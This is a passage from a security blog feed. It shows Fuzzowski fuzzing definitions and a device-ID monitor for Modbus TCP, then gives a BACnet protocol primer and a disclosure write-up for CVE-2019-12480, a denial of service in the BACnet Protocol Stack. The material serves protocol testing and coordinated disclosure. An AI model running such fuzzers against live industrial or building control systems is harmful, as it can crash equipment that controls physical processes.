    Use at your own risk, and please do not use in a production environment
    @Author: https://github.com/1modm
    Based on https://github.com/youngcraft/boofuzz-modbus
    and https://github.com/riptideio/pymodbus
    virtualenv venv -p python3
    source venv/bin/activate
    pip install -r requirements.txt
    python -m fuzzowski 127.0.0.1 502 -p tcp -f modbus -rt 0.5 -r read_coil
    python -m fuzzowski 127.0.0.1 502 -p tcp -f modbus 
    python -m fuzzowski 127.0.0.1 502 -p tcp -f modbus -rt 1 -m modbusMon
    &quot;&quot;&quot;

    # --------------------------------------------------------------- #

    name = &apos;modbus&apos;

    @staticmethod
    def get_requests() -&amp;gt; List[callable]:
        return [MODBUS.read_coil, MODBUS.read_input, MODBUS.read_holding, MODBUS.read_discrete, MODBUS.single_coil, MODBUS.single_register, MODBUS.multiple_coil, MODBUS.multiple_register, MODBUS.other_operations]

    # --------------------------------------------------------------- #

    @staticmethod
    def define_nodes(*args, **kwargs) -&amp;gt; None:
        
        # ------------------ Read Coil Status (FC=01) ------------------- #

        s_initialize(&quot;modbus_read_coil&quot;)
        with s_block(&quot;modbus_head&quot;):
            s_word(0x0001,name=&apos;transId&apos;,fuzzable=True)
            s_word(0x0000,name=&apos;protoId&apos;,fuzzable=False)
            s_word(0x06,name=&apos;length&apos;)
            s_byte(0xff,name=&apos;unit Identifier&apos;,fuzzable=False)
            with s_block(&apos;pdu&apos;):
                s_byte(0x01,name=&apos;funcCode read coil memory&apos;,fuzzable=False)
                s_word(0x0000,name=&apos;start address&apos;)
                s_word(0x0000,name=&apos;quantity&apos;)
        

        s_initialize(&apos;read_holding_registers&apos;)
        with s_block(&quot;modbus_head&quot;):
            s_word(0x0001,name=&apos;transId&apos;,fuzzable=True)
            s_word(0x0002,name=&apos;protoId&apos;,fuzzable=False)
            s_word(0x06,name=&apos;length&apos;)
            s_byte(0xff,name=&apos;unit Identifier&apos;,fuzzable=False)
            with s_block(&apos;read_holding_registers_block&apos;):
                s_byte(0x01,name=&apos;read_holding_registers&apos;)
                s_word(0x0000,name=&apos;start address&apos;)
                s_word(0x0000,name=&apos;quantity&apos;)
        # --------------------------------------------------------------- #


        # ------------------ Read Input Status (FC=02) ------------------ #
        s_initialize(&apos;ReadDiscreteInputs&apos;)
        with s_block(&quot;modbus_head&quot;):
            s_word(0x0001,name=&apos;transId&apos;,fuzzable=True)
            s_word(0x0002,name=&apos;protoId&apos;,fuzzable=False)
            s_word(0x06,name=&apos;length&apos;)
            s_byte(0xff,name=&apos;unit Identifier&apos;,fuzzable=False)
            with s_block(&apos;ReadDiscreteInputsRequest&apos;):
                s_byte(0x02,name=&apos;funcCode&apos;,fuzzable=False)
                s_word(0x0000,name=&apos;start_address&apos;)
                s_word(0x0000,name=&apos;quantity&apos;)
        # --------------------------------------------------------------- #

        # ---------------- Read Holding Registers (FC=03) --------------- #
        s_initialize(&apos;ReadHoldingRegisters&apos;)
        with s_block(&quot;modbus_head&quot;):
            s_word(0x0001,name=&apos;transId&apos;,fuzzable=True)
            s_word(0x0002,name=&apos;protoId&apos;,fuzzable=False)
            s_word(0x06,name=&apos;length&apos;)
            s_byte(0xff,name=&apos;unit Identifier&apos;,fuzzable=False)
            with s_block(&apos;ReadHoldingRegistersRequest&apos;):
                s_byte(0x03,name=&apos;funcCode&apos;,fuzzable=False)
                s_word(0x0000,name=&apos;start_address&apos;)
                s_word(0x0000,name=&apos;quantity&apos;)
        # --------------------------------------------------------------- #

        # ---------------- Read Input Registers (FC=04) ----------------- #
        s_initialize(&apos;ReadInputRegisters&apos;)
        with s_block(&quot;modbus_head&quot;):
            s_word(0x0001,name=&apos;transId&apos;,fuzzable=True)
            s_word(0x0002,name=&apos;protoId&apos;,fuzzable=False)
            s_word(0x06,name=&apos;length&apos;)
            s_byte(0xff,name=&apos;unit Identifier&apos;,fuzzable=False)
            with s_block(&apos;ReadInputRegistersRequest&apos;):
                s_byte(0x04,name=&apos;funcCode&apos;,fuzzable=False)
                s_word(0x0000,name=&apos;start_address&apos;)
                s_word(0x0000,name=&apos;quantity&apos;)
        # --------------------------------------------------------------- #


        # ------------------ Force Single Coil (FC=05) ------------------ #
        s_initialize(&apos;WriteSingleCoil&apos;)
        with s_block(&quot;modbus_head&quot;):
            s_word(0x0001,name=&apos;transId&apos;,fuzzable=True)
            s_word(0x0002,name=&apos;protoId&apos;,fuzzable=False)
            s_word(0x06,name=&apos;length&apos;)
            s_byte(0xff,name=&apos;unit Identifier&apos;,fuzzable=False)
            with s_block(&apos;WriteSingleCoilRequest&apos;):
                s_byte(0x05,name=&apos;funcCode&apos;,fuzzable=False)
                s_word(0x0000,name=&apos;start_address&apos;)
                s_word(0x0000,name=&apos;quantity&apos;)
        # --------------------------------------------------------------- #

        # ---------------- Preset Single Register (FC=06) --------------- #

        s_initialize(&apos;WriteSingleRegister&apos;)
        with s_block(&quot;modbus_head&quot;):
            s_word(0x0001,name=&apos;transId&apos;,fuzzable=True)
            s_word(0x0002,name=&apos;protoId&apos;,fuzzable=False)
            s_word(0x06,name=&apos;length&apos;)
            s_byte(0xff,name=&apos;unit Identifier&apos;,fuzzable=False)
            with s_block(&apos;WriteSingleRegisterRequest&apos;):
                s_byte(0x06,name=&apos;funcCode&apos;,fuzzable=False)
                s_word(0x0000,name=&apos;output_address&apos;)
                s_word(0x0000,name=&apos;output_value&apos;)
        # --------------------------------------------------------------- #

        # ---------------- Force Multiple Coils (FC=15) ----------------- #
        s_initialize(&apos;WriteMultipleCoils&apos;)
        with s_block(&quot;modbus_head&quot;):
            s_word(0x0001,name=&apos;transId&apos;,fuzzable=True)
            s_word(0x0002,name=&apos;protoId&apos;,fuzzable=False)
            s_word(0x06,name=&apos;length&apos;)
            s_byte(0xff,name=&apos;unit Identifier&apos;,fuzzable=False)
            with s_block(&apos;WriteMultipleCoilsRequest&apos;):
                s_byte(0x0f,name=&apos;func_code&apos;,fuzzable=False)
                s_word(0x0000,name=&apos;starting_address&apos;)
                s_dword(0x0000,name=&apos;byte_count&apos;)
                s_size(&quot;outputsValue&quot;, length=8)
                with s_block(&quot;outputs&quot;):
                    s_word(0x00,name=&apos;outputsValue&apos;)
        # --------------------------------------------------------------- #

        # --------------- Preset Multiple Registers (FC=16) ------------- #
        s_initialize(&apos;WriteMultipleRegisters&apos;)
        with s_block(&quot;modbus_head&quot;):
            s_word(0x0001,name=&apos;transId&apos;,fuzzable=True)
            s_word(0x0002,name=&apos;protoId&apos;,fuzzable=False)
            s_word(0x06,name=&apos;length&apos;)
            s_byte(0xff,name=&apos;unit Identifier&apos;,fuzzable=False)
            with s_block(&apos;WriteMultipleRegistersRequest&apos;):
                s_byte(0x10,name=&apos;func_code&apos;,fuzzable=False)
                s_word(0x0000,name=&apos;starting_address&apos;)
                s_dword(0x0000,name=&apos;byte_count&apos;)
                s_size(&quot;outputsValue&quot;,length=16)
                s_size(&quot;outputsValue2&quot;, length=8)
                with s_block(&quot;outputs&quot;):
                    s_dword(0x0000,name=&apos;outputsValue3&apos;)
        # --------------------------------------------------------------- #


        # ---------------------------- Other ---------------------------- #
        s_initialize(&apos;ReadExceptionStatus&apos;)
        with s_block(&quot;modbus_head&quot;):
            s_word(0x0001,name=&apos;transId&apos;,fuzzable=True)
            s_word(0x0002,name=&apos;protoId&apos;,fuzzable=False)
            s_word(0x06,name=&apos;length&apos;)
            s_byte(0xff,name=&apos;unit Identifier&apos;,fuzzable=False)
            with s_block(&apos;ReadExceptionStatusRequest&apos;):
                s_byte(0x07,name=&apos;funcCode&apos;,fuzzable=False)
    

        s_initialize(&apos;ReadExceptionStatusError&apos;)
        with s_block(&quot;modbus_head&quot;):
            s_word(0x0001,name=&apos;transId&apos;,fuzzable=True)
            s_word(0x0002,name=&apos;protoId&apos;,fuzzable=False)
            s_word(0x06,name=&apos;length&apos;)
            s_byte(0xff,name=&apos;unit Identifier&apos;,fuzzable=False)
            with s_block(&apos;ReadExceptionStatusErrorRequest&apos;):
                s_byte(0x87,name=&apos;funcCode&apos;,fuzzable=False)

        s_initialize(&apos;ReportSlaveId&apos;)
        with s_block(&quot;modbus_head&quot;):
            s_word(0x0001,name=&apos;transId&apos;,fuzzable=True)
            s_word(0x0002,name=&apos;protoId&apos;,fuzzable=False)
            s_word(0x06,name=&apos;length&apos;)
            s_byte(0xff,name=&apos;unit Identifier&apos;,fuzzable=False)
            with s_block(&apos;ReportSlaveIdRequest&apos;):
                s_byte(0x11,name=&apos;func_code&apos;,fuzzable=False)

        s_initialize(&apos;ReadFileSub&apos;)
        with s_block(&quot;modbus_head&quot;):
            s_word(0x0001,name=&apos;transId&apos;,fuzzable=True)
            s_word(0x0002,name=&apos;protoId&apos;,fuzzable=False)
            s_word(0x06,name=&apos;length&apos;)
            s_byte(0xff,name=&apos;unit Identifier&apos;,fuzzable=False)
            with s_block(&apos;ReadFileSubRequest&apos;):
                s_byte(0x06,name=&apos;refType&apos;,fuzzable=False)
                s_word(0x0001,name=&apos;fileNumber&apos;)
                s_word(0x0000,name=&apos;recordNumber&apos;)
                s_word(0x0000,name=&apos;recordLength&apos;)

        s_initialize(&apos;ReadFileRecord&apos;)
        with s_block(&quot;modbus_head&quot;):
            s_word(0x0001,name=&apos;transId&apos;,fuzzable=True)
            s_word(0x0002,name=&apos;protoId&apos;,fuzzable=False)
            s_word(0x06,name=&apos;length&apos;)
            s_byte(0xff,name=&apos;unit Identifier&apos;,fuzzable=False)
            with s_block(&apos;ReadFileRecordRequest&apos;):
                s_byte(0x14,name=&apos;funcCode&apos;,fuzzable=False)
                s_byte(0x0001,name=&apos;byteCount&apos;)

        s_initialize(&apos;WriteFileSub&apos;)
        with s_block(&quot;modbus_head&quot;):
            s_word(0x0001,name=&apos;transId&apos;,fuzzable=True)
            s_word(0x0002,name=&apos;protoId&apos;,fuzzable=False)
            s_word(0x06,name=&apos;length&apos;)
            s_byte(0xff,name=&apos;unit Identifier&apos;,fuzzable=False)
            with s_block(&apos;WriteFileSubRequest&apos;):
                s_byte(0x06,name=&apos;refType&apos;,fuzzable=False)
                s_word(0x0001,name=&apos;fileNumber&apos;)
                s_word(0x0000,name=&apos;recordNumber&apos;)
                # ---------------------------------
                # s_size is record
                s_size(&apos;recordData&apos;,length=16,name=&apos;recordLength&apos;)
                with s_block(&quot;recordData&quot;):
                    s_word(0x0000,name=&apos;recordData_value&apos;)
                s_word(0x0000,name=&apos;recordLength_value&apos;)

        s_initialize(&apos;WriteFileRecord&apos;)
        with s_block(&quot;modbus_head&quot;):
            s_word(0x0001,name=&apos;transId&apos;,fuzzable=True)
            s_word(0x0002,name=&apos;protoId&apos;,fuzzable=False)
            s_word(0x06,name=&apos;length&apos;)
            s_byte(0xff,name=&apos;unit Identifier&apos;,fuzzable=False)
            with s_block(&apos;WriteFileRecordRequest&apos;):
                s_byte(0x15,name=&apos;funcCode&apos;,fuzzable=False)
                s_byte(0x00,name=&apos;datalength&apos;)

        s_initialize(&apos;MaskWriteRegister&apos;)
        with s_block(&quot;modbus_head&quot;):
            s_word(0x0001,name=&apos;transId&apos;,fuzzable=True)
            s_word(0x0002,name=&apos;protoId&apos;,fuzzable=False)
            s_word(0x06,name=&apos;length&apos;)
            s_byte(0xff,name=&apos;unit Identifier&apos;,fuzzable=False)
            with s_block(&apos;MaskWriteRegisterRequest&apos;):
                s_byte(0x96,name=&apos;funcCode&apos;,fuzzable=False)
                s_word(0x0000,name=&apos;refAddr&apos;)
                s_word(0xffff,name=&apos;andMask&apos;)
                s_word(0x0000,name=&apos;orMask&apos;)

        s_initialize(&apos;ReadWriteMultipleRegisters&apos;)
        with s_block(&quot;modbus_head&quot;):
            s_word(0x0001,name=&apos;transId&apos;,fuzzable=True)
            s_word(0x0002,name=&apos;protoId&apos;,fuzzable=False)
            s_word(0x06,name=&apos;length&apos;)
            s_byte(0xff,name=&apos;unit Identifier&apos;,fuzzable=False)
            with s_block(&apos;ReadWriteMultipleRegistersRequest&apos;):
                s_byte(0x17,name=&apos;funcCode&apos;,fuzzable=False)
                s_word(0x0000,name=&apos;readStartingAddr&apos;)
                s_word(0x0001,name=&apos;readQuantityRegisters&apos;)
                s_word(0x0000,name=&apos;writeStartingAddr&apos;)
                s_size(&apos;writeQuantityRegisters&apos;,length=16,endian=&apos;&amp;gt;&apos;,name=&quot;writeQuantityRegisters&quot;)
                s_size(&apos;writeQuantityRegisters&apos;, length=8, endian=&apos;&amp;gt;&apos;,name=&quot;byteCount&quot;,math=lambda x:2*x)
                with s_block(&apos;writeQuantityRegisters_block&apos;):
                    s_size(&apos;modbus_head&apos;,length=2)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The monitor piece define a way to send a query for MODBUS device id to the target and check the response.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# --------------------------------------------------------------- #
SlaveID = 1 # Modbus TCP Unit Identifier: 1..247
# --------------------------------------------------------------- #

# ----------------- Device ID to bytes -------------------------- #
def bitDeviceID(DeviceID):
    bytes_id = (DeviceID).to_bytes((DeviceID.bit_length() + 7) // 8, byteorder=&apos;big&apos;)
    return bytes_id

HexSlaveID = bitDeviceID(SlaveID)

class modbusMonitor(IMonitor):
    &quot;&quot;&quot;
    MODBUS Monitor Module interface
    @Author: https://github.com/1modm
    &quot;&quot;&quot;

    # Based on https://svn.nmap.org/nmap/scripts/modbus-discover.nse
    # Send Read Device Identification 
    get_modbus_device_id_nse = (b&quot;\x00\x00&quot;  # Modbus TCP Transaction Identifier
                               b&quot;\x00\x00&quot;  # Modbus TCP Protocol Identifier
                               b&quot;\x00\x05&quot;  # Modbus TCP Length
                               # Modbus TCP Unit Identifier
                               + HexSlaveID +
                               # Discover device ID
                               b&quot;\x2b&quot;  # Modbus Function Code: Encapsulated Interface Transport
                               b&quot;\x0e&quot;  # Modbus MEI type: Read Device Identification
                               b&quot;\x01&quot;  # Modbus Read Device ID: Basic Device Identification
                               b&quot;\x00&quot;  # Modbus Object ID: VendorName
                               )

    # Send Report Slave ID request
    get_modbus_slave_id = (b&quot;\x00\x00&quot;  # Modbus TCP Transaction Identifier
                           b&quot;\x00\x00&quot;  # Modbus TCP Protocol Identifier
                           b&quot;\x00\x02&quot;  # Modbus TCP Length
                           # Modbus TCP Unit Identifier
                           + HexSlaveID +  
                           b&quot;\x11&quot;  # Report Slave ID
                           #b&quot;\x04&quot;, # Send read input register instead previous?
                           )

    @staticmethod
    def name() -&amp;gt; str:
        return &quot;modbusMon&quot;

    @staticmethod
    def help():
        return &quot;Sends a query for MODBUS device id to the target and check the response&quot;

    def test(self):
        conn = self.get_connection_copy()
        result = self._get_modbus_info(conn)
        return result


    def _get_modbus_info(self, conn: ITargetConnection):
        try:
            conn.open()
            conn.send(self.get_modbus_device_id_nse) # or get_modbus_slave_id
            data = conn.recv_all(10000)
            if len(data) == 0:
                self.logger.log_error(&quot;MODBUS error response, getting MODBUS device information Failed!!&quot;)
                result = False
            else:
                Unit_ID = data[6].to_bytes((data[6].bit_length() + 7) // 8, byteorder=&apos;big&apos;)
                Func_code = data[7]
                Exception_code = data[8]

                if data[5] &amp;gt; 0 and Unit_ID == HexSlaveID:
                    if hex(Func_code) == &apos;0x11&apos;:
                      self.logger.log_info(f&quot;Getting MODBUS device information succeeded&quot;)
                    elif hex(Exception_code) == &apos;0xb&apos;: # more details needed? and (hex(Func_code) == &apos;0x91&apos; or hex(Func_code) == &apos;0x84&apos;)
                      self.logger.log_warn(f&quot;Getting MODBUS device information: Gateway target device failed to respond&quot;)
                    elif hex(Exception_code) == &apos;0x1&apos;:
                      self.logger.log_warn(f&quot;Getting MODBUS device information: Illegal function&quot;)
                    else:
                      self.logger.log_warn(f&quot;Getting MODBUS device information warning&quot;)
                else:
                  self.logger.log_warn(f&quot;Getting MODBUS data error&quot;)

                result = True
        except Exception as e:
            self.logger.log_error(f&quot;MODBUS response error, getting MODBUS device information Failed!! Exception while receiving: {type(e).__name__}. {str(e)}&quot;)
            result = False
        finally:
            conn.close()

        return result
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;references&quot;&gt;References&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.incibe.es/extfrontinteco/img/File/intecocert/ManualesGuias/incibe_protocol_net_security_ics.pdf&quot;&gt;Protocols and network security in ICS infrastructures&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.blackhat.com/docs/us-17/wednesday/us-17-Brandstetter-insecurity-In-Building-Automation-How-To-Create-Dark-Buildings-With-Light-Speed.pdf&quot;&gt;(in)security in building automation&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/nccgroup/fuzzowski&quot;&gt;Fuzzowski&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/OpenRCE/sulley&quot;&gt;Sulley&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/jtpereyda/boofuzz&quot;&gt;BooFuzz&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://bdocam.com/I2BS_TEST/I2BS/BacNet/Protocol/135_2004.pdf&quot;&gt;135_2004&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.bacnetwiki.com/wiki/index.php?title=Main_Page&quot;&gt;BACnet Wiki&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.bac-test.com/how-to-build-a-foss-bacnet-server-based-on-steve-kargs-sourceforge-project/&quot;&gt;The Free or Open Source Software BACnet Stack&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://sourceforge.net/projects/bacnet/&quot;&gt;BACnet Protocol Stack&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2019-12480&quot;&gt;NVD CVE-2019-12480 Details&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.ashrae.org/technical-resources/bookstore/bacnet&quot;&gt;BACnet ashrae&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

</description>
        <pubDate>Tue, 14 Jul 2020 00:00:00 +0100</pubDate>
        <link>https://1modm.github.io/Fuzzing_ICS_protocols.html</link>
        <guid isPermaLink="true">https://1modm.github.io/Fuzzing_ICS_protocols.html</guid>
        
        
      </item>
    
      <item>
        <title>BACnet CVE-2019-12480</title>
        <description>&lt;p&gt;Is there an increase of interest and focus in Cybersecurity referring to Industrial Control Systems (ICSs), not only PLCs, HMIs, RTUs and sensors, there are other elements like chillers, industrial refrigeration, fire detection, fire suppression, energy storage, HVACs, etc. which can be managed through the BACnet protocol.&lt;/p&gt;

&lt;p&gt;Usually are referenced under the term “Intelligent Buildings”, however, their use is neither exclusive to them nor is it something relatively new. The building management is given by the acronym BMS, Building Management System and must be distinguished between residential buildings or industrial buildings. In general, BMS systems integrate a set of subsystems in charge of lighting, fire, alarm, elevator, ventilation, temperature, etc. control systems. Although many of them are common to both environments we cannot say that they are similar since the applications and scope are different.&lt;/p&gt;

&lt;p&gt;These systems must communicate with each other for their own operation and management. One of the protocols used is BACnet (Buiding Automation Control Network) a Data Communication Protocol for Building Automation and Control Networks approved by the ASHRAE Standards Committee. In June 1987 the American Society of Heating, Refrigeration and Air-conditioning Engineers (ASHRAE) set up the Standard Project Committee 135 (SPC 135) to develop a data communications protocol for Building, Automation and Control Networks (BACnet). As well as becoming a US national standard in 1995 (ASHRAE/ANSI 135-1995) and then updated in 2001, in many countries it also became an ISO standard 16484-5 in January 2003. BACnet also became a European standard CEN TC 247 in 2003.&lt;/p&gt;

&lt;p&gt;BACnet has  been  designed  specifically  to  meet  the  communication  needs  of  building  automation  and  control  systems  for  applications  such  as  heating,  ventilating,  and  air-conditioning control, lighting control, access control, and fire detection systems. The BACnet protocol provides mechanisms by which computerized equipment of arbitrary function may exchange information, regardless of the particular building service it performs. As a result, the BACnet protocol may be used by head-end computers, general-purpose direct digital controllers, and application specific or unitary controllers with equal effect.&lt;/p&gt;

&lt;p&gt;Like many others, each BACNet device is a combination of hardware and software, like devices working as controllers, gateways or user interfaces. Each of them has a unique identifier or instance number that identifies and differentiates them from those existing in the network apart from others with information regarding the inputs and outputs that these devices monitors and controls.&lt;/p&gt;

&lt;p&gt;In BACnet we can find 3 differentiated concepts, Objects, Properties and Services, all the information contained within a BACnet device is ordered as objects, which makes it a protocol oriented precisely to this, to objects. Each “Object” represents a component of the device itself or a set of information that can be requested by another through other protocols or layers such as Ethernet, IP, RS-485, etc. The protocol defines more than 50 types of objects for the most common uses.&lt;/p&gt;

&lt;h2 id=&quot;bacnet&quot;&gt;BACnet&lt;/h2&gt;

&lt;p&gt;BACnet was designed to allow communication of building automation and control systems for applications such as heating, ventilating, and air-conditioning control (HVAC), lighting control, access control, and fire detection systems and their associated equipment. The BACnet protocol provides mechanisms for computerized building automation devices to exchange information, regardless of the particular building service they perform.&lt;/p&gt;

&lt;p&gt;BACnet is a communications protocol for Building Automation and Control (BAC) networks UDP based and contains 3 main headers the BVLC, NPDU and APDU.&lt;/p&gt;

&lt;p&gt;A request to BACnet passes down through the lower layers of the protocol stack in the local device, this process can be observed in the next image &lt;a href=&quot;http://bdocam.com/I2BS_TEST/I2BS/BacNet/Protocol/135_2004.pdf&quot;&gt;Source&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;public/images/BACnet_protocol_stack_data_flow.png&quot; alt=&quot;BACnet_protocol_stack_data_flow&quot; title=&quot;BACnet_protocol_stack_data_flow&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The 3 headers can be examined in the &lt;a href=&quot;http://www.bacnetwiki.com/wiki/index.php?title=Main_Page&quot;&gt;BACnet Wiki&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;public/images/BACnet_packet.png&quot; alt=&quot;BACnet_packet&quot; title=&quot;BACnet_packet&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;bvlc-bacnet-virtual-link-control-4-bytes&quot;&gt;BVLC (BACNet virtual link control): 4 bytes&lt;/h3&gt;

&lt;p&gt;The firts byte defines the type, in this case bacnet/ip 0x81, the second one defines the function 0x0a, and the last 2 bytes defines the length of the whole packet &lt;a href=&quot;http://www.bacnetwiki.com/wiki/index.php?title=BACnet_Virtual_Link_Layer&quot;&gt;BACnet Wiki&lt;/a&gt;:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;The firts byte defines the type: bacnet/ip 0x81&lt;/li&gt;
  &lt;li&gt;The second byte defines the function 0x0a (ORIGINAL_UNICAST_NPDU = 10)&lt;/li&gt;
  &lt;li&gt;The last 2 bytes defines the length of the whole packet&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;public/images/bvlc.png&quot; alt=&quot;bvlc&quot; title=&quot;bvlc&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;NPDU Function:&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;public/images/bvlc-function.png&quot; alt=&quot;bvlc&quot; title=&quot;bvlc&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we can see in the BACnet packet the UDP Port number used by BACnet communications over IP is 47808:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;public/images/bvlc-pcap.png&quot; alt=&quot;bvlc&quot; title=&quot;bvlc&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;npdu-network-layer-protocol-data-unit-2-bytes&quot;&gt;NPDU (Network layer protocol data unit): 2 bytes&lt;/h3&gt;

&lt;p&gt;The NPDU consists of a NPCI followed by a NSDU. &lt;a href=&quot;http://www.bacnetwiki.com/wiki/index.php?title=Network_Layer_Protocol_Data_Unit&quot;&gt;BACnet Wiki&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;According bacnetwiki this is the representation, but be careful here, in practice the headers is just 2 bytes, Version (Always 0x01) and NPCI Control Octet:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;public/images/npdu.png&quot; alt=&quot;npdu&quot; title=&quot;npdu&quot; /&gt;&lt;/p&gt;

&lt;p&gt;NPDU Layer:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;public/images/npdu-pcap.png&quot; alt=&quot;npdu&quot; title=&quot;npdu&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;apdu-network-layer-protocol-data-unit-2-bytes&quot;&gt;APDU (Network layer protocol data unit): 2 bytes&lt;/h3&gt;

&lt;p&gt;BACnet APDUs carry the Application Layer parameters. The maximum size of an APDU is specified by a device’s Max_APDU_Length_Accepted, be careful with that, otherwise you will face malformed packet issues. &lt;a href=&quot;http://www.bacnetwiki.com/wiki/index.php?title=APDU&quot;&gt;BACnet APDU&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;public/images/apdu-pcap.png&quot; alt=&quot;apdu&quot; title=&quot;apdu&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;testbed&quot;&gt;Testbed&lt;/h2&gt;

&lt;p&gt;If we want to create our own lab and scenario we can install the OpenSource BACnet Protocol Stack and test the connectivity to BACnet port, we need:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.bac-test.com/how-to-build-a-foss-bacnet-server-based-on-steve-kargs-sourceforge-project/&quot;&gt;The Free or Open Source Software BACnet Stack&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;A BACNet port open UDP 47808&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ sudo apt-get install -y build-essential
$ sudo apt-get install subversion
$ svn checkout svn://svn.code.sf.net/p/bacnet/code/trunk/bacnet-stack bacnetServer
$ cd bacnetServer
$ make clean all
$ demo/server/bacserv
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;cve-2019-12480-bacnet-protocol-stack-segmentation-fault-leading-to-denial-of-service&quot;&gt;CVE-2019-12480: BACnet Protocol Stack Segmentation fault leading to denial of service&lt;/h1&gt;

&lt;h2 id=&quot;disclosure-timeline&quot;&gt;Disclosure Timeline&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;20/05/2019 Discovered vulnerability and developed baseline proof-of-concept.&lt;/li&gt;
  &lt;li&gt;24/05/2019 Reported to https://sourceforge.net/p/bacnet/bugs/61/&lt;/li&gt;
  &lt;li&gt;28/05/2019 Anonymous reported similar issue to https://sourceforge.net/p/bacnet/bugs/62/&lt;/li&gt;
  &lt;li&gt;29/05/2019 Updated disclosure, sent notes and exploits. Asked for a CVE and coordinated disclosure.&lt;/li&gt;
  &lt;li&gt;19/07/2019 Updated CVE Description CVE-2019-12480.&lt;/li&gt;
  &lt;li&gt;20/08/2019 Public disclosure&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;description&quot;&gt;Description&lt;/h2&gt;

&lt;p&gt;BACnet Protocol Stack through 0.8.6 has a segmentation fault leading to denial of service in BACnet APDU Layer because a malformed DCC in AtomicWriteFile, AtomicReadFile and DeviceCommunicationControl services. An unauthenticated remote attacker could cause a denial of service (bacserv daemon crash) because there is an invalid read in bacdcode.c during parsing of alarm tag numbers.&lt;/p&gt;

&lt;h2 id=&quot;cve&quot;&gt;CVE&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2019-12480&quot;&gt;NVD CVE-2019-12480 Details&lt;/a&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Score: 7.5 High&lt;/li&gt;
  &lt;li&gt;CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H&lt;/li&gt;
  &lt;li&gt;CWE: CWE-125&lt;/li&gt;
  &lt;li&gt;cpe:2.3:a:bacnet_protocol_stack_project:bacnet_protocol_stack:&lt;em&gt;:&lt;/em&gt;:&lt;em&gt;:&lt;/em&gt;:&lt;em&gt;:&lt;/em&gt;:&lt;em&gt;:&lt;/em&gt; Up to (including) 0.8.6&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;bug-references-and-exploit&quot;&gt;Bug References and Exploit&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://sourceforge.net/p/bacnet/bugs/61/&quot;&gt;https://sourceforge.net/p/bacnet/bugs/61/&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://sourceforge.net/p/bacnet/bugs/62/&quot;&gt;https://sourceforge.net/p/bacnet/bugs/62/&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.exploit-db.com/exploits/47148&quot;&gt;https://www.exploit-db.com/exploits/47148&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://packetstormsecurity.com/files/153716/BACnet-Stack-0.8.6-Denial-Of-Service.html&quot;&gt;http://packetstormsecurity.com/files/153716/BACnet-Stack-0.8.6-Denial-Of-Service.html&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;fixes&quot;&gt;Fixes&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://sourceforge.net/p/bacnet/code/3220&quot;&gt;https://sourceforge.net/p/bacnet/code/3220&lt;/a&gt;&lt;/li&gt;
